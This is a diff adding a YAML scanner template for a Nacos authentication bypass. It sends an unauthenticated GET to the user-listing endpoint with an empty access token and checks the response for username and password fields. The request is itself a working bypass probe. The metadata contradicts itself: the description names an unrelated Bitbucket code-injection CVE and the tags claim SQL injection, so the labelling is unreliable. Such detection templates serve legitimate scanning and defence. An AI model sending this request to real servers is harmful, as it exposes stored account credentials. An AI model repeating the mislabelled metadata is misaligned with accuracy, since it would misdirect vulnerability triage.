@@ -1,0 +1,32 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"username":'
+          - '"password":'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - application/json
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken='
+id: nacos-core-auth-enabled-bypass
+info:
+  author: yoyo
+  description: atlassian-bitbucket-代码注入-CVE-2022-36804
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Nacos core.auth.enabled 权限绕过
+  severity: critical
+  tags: nacos,sqli,argus-import
